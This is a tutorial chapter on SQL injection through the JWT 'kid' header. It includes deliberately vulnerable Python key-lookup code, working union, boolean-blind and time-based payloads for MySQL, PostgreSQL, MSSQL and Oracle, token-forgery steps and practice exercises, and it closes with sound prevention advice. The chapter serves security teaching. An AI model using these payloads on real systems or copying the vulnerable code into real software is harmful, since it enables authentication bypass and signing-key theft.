# 16 - JWT SQL Injection

## Overview

JSON Web Tokens (JWT) can contain SQL injection vulnerabilities when the `kid` (Key ID) header parameter is used to retrieve cryptographic keys from a database. This guide covers how SQL injection in JWT processing can lead to signature bypass and token forgery.

## Understanding JWT Structure

A JWT consists of three parts:

```
header.payload.signature

Example:
eyJhbGciOiJIUzI1NiIsICJraWQiOiIxIn0.eyJ1c2VyIjoiYWRtaW4ifQ.signature
```

**Header (Decoded):**

```json
{
  "alg": "HS256",
  "kid": "1"
}
```

**Payload (Decoded):**

```json
{
  "user": "admin",
  "role": "administrator"
}
```

## The KID Parameter Vulnerability

### How KID Works

The `kid` (Key ID) header parameter identifies which cryptographic key was used to sign the JWT. Applications often retrieve keys from databases:

```python
def get_signing_key(kid):
    # VULNERABLE - SQL injection in JWT processing
    query = f"SELECT key FROM jwt_keys WHERE kid = '{kid}'"
    return db.execute(query)
```

### Attack Flow

| Step | Action                    | Result                           |
| ---- | ------------------------- | -------------------------------- |
| 1    | Attacker crafts JWT       | Malicious KID parameter injected |
| 2    | Application extracts KID  | From JWT header                  |
| 3    | SQL query executed        | To retrieve signing key          |
| 4    | Injection modifies lookup | Returns unexpected key           |
| 5    | Attacker forges tokens    | Valid JWT with compromised key   |

## SQL Injection in KID

### Basic Injection

**Malicious JWT Header:**

```json
{
  "alg": "HS256",
  "kid": "1' OR '1'='1"
}
```

**Resulting SQL:**

```sql
SELECT key FROM jwt_keys WHERE kid = '1' OR '1'='1'
-- Returns first key, any key, or predictable key
```

### Union-Based Key Extraction

**Payload:**

```json
{
  "alg": "HS256",
  "kid": "1' UNION SELECT 'attacker-controlled-key'--"
}
```

**Resulting SQL:**

```sql
SELECT key FROM jwt_keys WHERE kid = '1'
UNION SELECT 'attacker-controlled-key'--'
```

**Attack:**

1. Inject a union to return attacker-controlled key
2. Sign JWT with that key
3. Token validates successfully

### Boolean-Based Blind

**True Condition:**

```json
{
  "kid": "1' AND (SELECT SUBSTRING(key,1,1) FROM jwt_keys WHERE kid='1')='a'--"
}
```

**Detection:**

- If condition true: Normal JWT validation proceeds
- If condition false: Key not found, validation fails

### Time-Based Blind

**Payload:**

```json
{
  "kid": "1' AND (SELECT pg_sleep(5)) IS NULL--"
}
```

**Detection:**

- 5 second delay confirms injection
- No delay = not vulnerable or condition false

## Attack Scenarios

### Scenario 1: Signature Bypass

**Vulnerable Code:**

```python
def verify_jwt(token):
    header = decode_base64(token.split('.')[0])
    kid = header['kid']

    # VULNERABLE
    key = db.query(f"SELECT key FROM jwt_keys WHERE kid = '{kid}'")[0]

    return verify_signature(token, key)
```

**Attack:**

```json
{
  "alg": "HS256",
  "kid": "1' UNION SELECT 'secret'--",
  "user": "admin",
  "role": "administrator"
}
```

Sign with `secret` → Token validates as legitimate

### Scenario 2: Privilege Escalation

**Attack Steps:**

1. Obtain valid JWT as regular user
2. Modify payload to `role: "admin"`
3. Use SQL injection in KID to retrieve signing key
4. Re-sign modified token
5. Access admin functions

### Scenario 3: Key Enumeration

**Blind Extraction:**

```json
{
  "kid": "1' AND ASCII(SUBSTRING((SELECT key FROM jwt_keys LIMIT 1),1,1))=115--"
}
```

Extract key character by character using boolean responses.

## Database-Specific Payloads

### MySQL

```json
{
  "kid": "1' UNION SELECT 'hacked'--"
}
```

**Time-Based:**

```json
{
  "kid": "1' AND (SELECT SLEEP(5))--"
}
```

### PostgreSQL

```json
{
  "kid": "1' UNION SELECT 'hacked'--"
}
```

**Time-Based:**

```json
{
  "kid": "1' AND (SELECT pg_sleep(5)) IS NULL--"
}
```

### MSSQL

```json
{
  "kid": "1' UNION SELECT 'hacked'--"
}
```

**Time-Based:**

```json
{
  "kid": "1'; WAITFOR DELAY '0:0:5'--"
}
```

### Oracle

```json
{
  "kid": "1' UNION SELECT 'hacked' FROM DUAL--"
}
```

**Time-Based:**

```json
{
  "kid": "1' AND DBMS_LOCK.SLEEP(5)=0--"
}
```

## Detection and Testing

### Step 1: Identify JWT Processing

Look for:

- JWT validation endpoints
- Key retrieval from database
- Dynamic key lookup by KID

### Step 2: Test KID Parameter

**Basic Test:**

```json
{
  "alg": "HS256",
  "kid": "'"
}
```

**Error Indicators:**

- Database error in logs
- Different validation behavior
- SQL syntax error messages

### Step 3: Confirm Injection

**Boolean Test:**

```json
{
  "kid": "1' AND '1'='1"  → Should validate
  "kid": "1' AND '1'='2"  → Should fail
}
```

**Time Test:**

```json
{
  "kid": "1' AND (SELECT SLEEP(5))--"
}
```

### Step 4: Exploit

Once confirmed:

1. Extract signing key
2. Forge arbitrary tokens
3. Escalate privileges

## Prevention

### Parameterized Queries

**Secure Code:**

```python
def get_signing_key(kid):
    # SECURE
    query = "SELECT key FROM jwt_keys WHERE kid = ?"
    return db.execute(query, (kid,))
```

### Input Validation

```python
def validate_kid(kid):
    # KID should be alphanumeric only
    if not re.match(r'^[a-zA-Z0-9_-]+$', kid):
        raise ValueError("Invalid KID format")
    return kid
```

### Key Caching

```python
# Cache keys in memory, avoid DB lookups
KEY_CACHE = {}

def get_signing_key(kid):
    if kid not in KEY_CACHE:
        key = fetch_from_db(kid)
        KEY_CACHE[kid] = key
    return KEY_CACHE[kid]
```

### Algorithm Verification

```python
def verify_jwt(token):
    header = decode_header(token)

    # Verify algorithm is expected
    if header['alg'] not in ['HS256', 'RS256']:
        raise ValueError("Unsupported algorithm")

    # Continue with key retrieval...
```

## Practice Exercises

### Exercise 1: Basic KID Injection

**Setup:**

- Application uses JWT with KID database lookup
- MySQL backend

**Task:**

1. Craft JWT with SQL injection in KID
2. Bypass signature verification
3. Forge admin token

**Payload:**

```json
{
  "alg": "HS256",
  "kid": "1' OR '1'='1",
  "user": "admin",
  "role": "administrator"
}
```

### Exercise 2: Blind KID Extraction

**Setup:**

- Blind SQL injection in KID processing
- No error messages

**Task:**

1. Use boolean-based blind to detect injection
2. Extract signing key character by character
3. Forge valid tokens

### Exercise 3: Time-Based Detection

**Setup:**

- No visible error differences
- Database supports time delays

**Task:**

1. Inject time-based payload in KID
2. Measure response times
3. Confirm injection and extract data

## Key Takeaways

1. **JWT KID parameter can be injection point** - Often overlooked
2. **Key retrieval from DB = SQL injection risk** - If not parameterized
3. **SQL injection in JWT = signature bypass** - Can forge arbitrary tokens
4. **Blind techniques work** - No visible output needed
5. **Input validation on KID** - Alphanumeric only

## Next Steps

Continue to [17 - GraphQL SQL Injection](17-GraphQL-SQL-Injection.md) to learn about GraphQL API vulnerabilities.
